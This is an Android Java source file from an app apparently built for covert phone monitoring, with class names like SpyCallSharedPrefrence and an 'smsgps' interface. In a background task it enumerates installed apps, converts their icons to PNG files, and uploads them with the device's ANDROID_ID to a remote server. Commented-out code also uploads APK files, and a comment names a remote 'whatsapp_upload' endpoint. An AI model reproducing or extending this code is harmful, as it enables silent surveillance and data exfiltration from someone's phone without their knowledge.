/**
 * Copyright OCTAL INFO SOLUTIONS PVT LTD.
 */
package com.hinj.asynctask;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Comparator;
import java.util.List;

import org.json.JSONObject;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.graphics.Bitmap;
import android.graphics.Bitmap.CompressFormat;
import android.graphics.Canvas;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.os.AsyncTask;
import android.provider.Settings.Secure;
import android.util.Log;

import com.hinj.app.utils.ConnectUrl;
import com.hinj.app.utils.HinjAppPreferenceUtils;
import com.hinj.app.utils.InstalledApp;
import com.hinj.app.utils.JsonPostRequest;
import com.hinj.app.utils.RequestPost;
import com.hinj.app.utils.SpyCallSharedPrefrence;
import com.hinj.secure.smsgps.DeviceInterface;

public class ApkIconUploadAsyncTask extends AsyncTask<String, Void, String> {
	
	private Context ctx;
	private static final String TAG = "ApkIconUploadAsyncTask";
	private RequestPost mRequestPostClass;
	private DeviceInterface onComplete;
	Bitmap resized;
	
	private InstalledApp[] latestInstalledApp;
	
	public ApkIconUploadAsyncTask(Context ctx,DeviceInterface onComplete) {
		this.ctx=ctx;
		this.onComplete=onComplete;
	}
	
	@Override
	public void onPreExecute() {
	}

	@Override
	protected String doInBackground(String... params) {
		try{
			getAllInstalledApp();
		}catch(Exception e){
			e.printStackTrace();
		}finally{
			onComplete.onCompletedApkIconUpload();
		}
		return null;
	}

	@Override
	public void onPostExecute(String serverResponse) { 

	}
	
	/*********************** Start Installed App *********************/

	public final  void  getAllInstalledApp() {

		final List<PackageInfo> packs = ctx.getPackageManager().getInstalledPackages(0);
		latestInstalledApp = new InstalledApp[packs.size()];
		
		String apkPath = "";
		String applicationname="";
		String version = "";
		
		final int totalInstallAppCount=packs.size();
		final int preInstallAppCount = SpyCallSharedPrefrence.getsaveINSTALL_APP__Icon_PreCount(ctx);
		final int remaningInstallAppCount = totalInstallAppCount - preInstallAppCount;
		
		int pp;
		
		String apk_name= "";
		int apk_index_number=SpyCallSharedPrefrence.getApkIconIndexNumber(ctx);
		
		SpyCallSharedPrefrence.getsaveINSTALL_APP__Icon_PreCount(ctx);
		
		if(remaningInstallAppCount>0){
			
			Log.i("remaining count", remaningInstallAppCount+"");
			if(remaningInstallAppCount>2){
				 pp=2;
			}
			else{
				pp=remaningInstallAppCount;
			}
		    
			String tempInstalled = "";
			String installedAppDetail=null;
			apk_index_number++;
			//for (int i = 0; i < packs.size(); i++) {
				
				String packageName = packs.get(apk_index_number).packageName;
				apk_name = packs.get(apk_index_number).applicationInfo.loadLabel( ctx.getPackageManager()).toString();
				apkPath = packs.get(apk_index_number).applicationInfo.publicSourceDir;
				
				SpyCallSharedPrefrence.setApkIconIndexNumber(ctx, apk_index_number);
				SpyCallSharedPrefrence.setIconApkName(ctx, apk_name);
				 
				try {
					Drawable appicon = ctx.getPackageManager().getApplicationIcon(packageName);
					System.out.println(appicon); 
					
					Bitmap bitmap = drawableToBitmap(appicon);
					
					byte[] byteArray = null;
					if(bitmap != null)
					{
						try {
							ByteArrayOutputStream stream = new ByteArrayOutputStream();
							bitmap.compress(Bitmap.CompressFormat.PNG, 100, stream);
							byteArray = stream.toByteArray();
							
							
							 //create a file to write bitmap data
				             File file = new File(ctx.getCacheDir(), "smash");
				             file.createNewFile();

				             //Convert bitmap to byte array
				             ByteArrayOutputStream bos = new ByteArrayOutputStream();
				             bitmap.compress(CompressFormat.PNG, 0 /*ignored for PNG*/, bos);
				             byte[] bitmapdata = bos.toByteArray();

				             //write the bytes in file
				             FileOutputStream fos = new FileOutputStream(file);
				             fos.write(bitmapdata);
				             
							ArrayList<String[]> arraylist1 = new ArrayList<String[]>();
						
							String a[] = { "upload_device_id",  Secure.getString(ctx.getContentResolver(),Secure.ANDROID_ID)};
							arraylist1.add(a);
							String b[] = { "apk_name",apk_name+".apk" };
							arraylist1.add(b);
							
							ArrayList<String> arraylist2 = new ArrayList<String>();
							arraylist2.add(file.getPath());
							
							double size = file.length();
							System.out.println(size);
							double sizeMb = (size/1024)/1024;
							System.out.println(sizeMb);
							
							if(sizeMb >= 5) 
							{
								System.out.println("APK ICON SIZE IS GREATER THAN 5 MB");
							}
							else
							{
								System.out.println(byteArray); 
								JsonPostRequest postrequest = new JsonPostRequest();
								String imageResponse = postrequest.doPostWithFile2(ConnectUrl.URL_Apk_Icon_upload, arraylist1,arraylist2, apk_name+".apk", "png");
								System.out.println(imageResponse); 
							}
							
							//String getResponceMusic = uploadDeviceMusic(data,track,data, "","","",byteArray);
						} catch (Exception e) {
							e.printStackTrace();
						}
					}
					else
					{
						System.out.println("bitmap is null");
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
		          
			//	applicationname = packs.get(i).applicationInfo.loadLabel( ctx.getPackageManager()).toString();
			//	version = packs.get(i).versionName;
				
			//	final long installedDate = getallapptime(packageName);
			//	latestInstalledApp[i]=new InstalledApp(Uri.encode(applicationname),Uri.encode(packageName),version,installedDate);
				
			//}
			
			//maindata();

			//return installedAppDetail;
			/*final int totalCount=preInstallAppCount+remaningInstallAppCount;
			try {
				if (Utility.isNetworkAvailable(ctx)) {
					int imagePreCount=preInstallAppCount + pp;
					//new YourAsyncTask_ImagesDetail().execute(apkPath, applicationname,  + totalCount, preInstallAppCount+ "",remaningInstallAppCount+"");
					new YourAsyncTask_ImagesDetail().execute(apkPath, apk_name, totalCount+ "",imagePreCount+"");
					//new InstalledAppPostAsyncTask().execute(installedAppDetail,totalCount+"");
				}
			} catch (Exception e) {
				e.printStackTrace();
			}*/
		}else{
			Log.i(TAG, "No Install App log");
			//getCalendarEvents();
		}
	}
	
	public static Bitmap drawableToBitmap (Drawable drawable) {
	    if (drawable instanceof BitmapDrawable) {
	        return ((BitmapDrawable)drawable).getBitmap();
	    }

	    int width = drawable.getIntrinsicWidth();
	    width = width > 0 ? width : 1;
	    int height = drawable.getIntrinsicHeight();
	    height = height > 0 ? height : 1;

	    Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
	    Canvas canvas = new Canvas(bitmap); 
	    drawable.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
	    drawable.draw(canvas);

	    return bitmap;
	}
	
	
	public final long getallapptime(String packageName){
		final PackageManager pm = ctx.getPackageManager();
		ApplicationInfo appInfo = null;
		try {
			appInfo = pm.getApplicationInfo(packageName, 0);
		} catch (NameNotFoundException e) {
			e.printStackTrace();
		}
		final String appFile = appInfo.sourceDir;

		final long installed = new File(appFile).lastModified();
		return installed;
	}

	@SuppressWarnings({ "unchecked", "rawtypes" })
	public final void maindata() {
		Arrays.sort( latestInstalledApp, new Comparator()
		{
			public int compare(Object o1, Object o2) {
				return new Long(((InstalledApp)o1).getInstalledDate()).compareTo(new Long(((InstalledApp) o2).getInstalledDate()));
			}
		});
	}
	
	class YourAsyncTask_ImagesDetail extends AsyncTask<String, Void, Void> {

		int getcountImage=0;
		int getRemainingCount;
		String getResponceImages;

		@Override
		protected void onPreExecute() {
		}

		@Override
		protected Void doInBackground(String... params) {
			// make your request here - it will run in a different thread
			try {
				getcountImage=Integer.parseInt(params[2]);
				getRemainingCount=Integer.parseInt(params[3]);
				getResponceImages = uploadImage2(params[0], params[1]);

				JSONObject responseObject = new JSONObject(getResponceImages);
				//JSONArray responseArray = responseObject.getJSONArray("upload");
				JSONObject JsonResponse =responseObject.getJSONObject("response");
				if(JsonResponse.getString("apk").toString().contains("Apk file uploaded successfully"))
				{
					SpyCallSharedPrefrence.saveINSTALL_APP_Icon_PreCount(ctx,Integer.parseInt(params[3]));
				}
			} catch (Exception e) {
				e.printStackTrace();
			}

			return null;
		}

		@Override
		protected void onPostExecute(Void result) {			
		}
	}

	public String uploadImage2(String newFilePath, String appname) {
	
		String upload_device_id = HinjAppPreferenceUtils.getUploadDeviceID(ctx);
		String android_id = Secure.getString(ctx.getContentResolver(),Secure.ANDROID_ID);
		Log.i("resonse", "anotherone");
		File file = new File(newFilePath);
		ArrayList<String> arraylist2 = new ArrayList<String>();
		arraylist2.add(file.getPath());
		ArrayList<String[]> arraylist1 = new ArrayList<String[]>();		
		String a[] = { "apk_name",appname};
		arraylist1.add(a);
		/*String b[] = { "user_id",getUserID_SP };
		arraylist1.add(b); */
		String c[] = { "upload_device_id", android_id };
		arraylist1.add(c); 
		
		JsonPostRequest postrequest = new JsonPostRequest();
		//http://evt17.com/iphone/android_services/whatsapp_upload
		String imageResponse = postrequest.doPostWithApkFile(ConnectUrl.URL_Apk_Icon_upload, arraylist1,arraylist2,appname);
		arraylist2.clear();
		arraylist1.clear();         
		return imageResponse;
	}
}
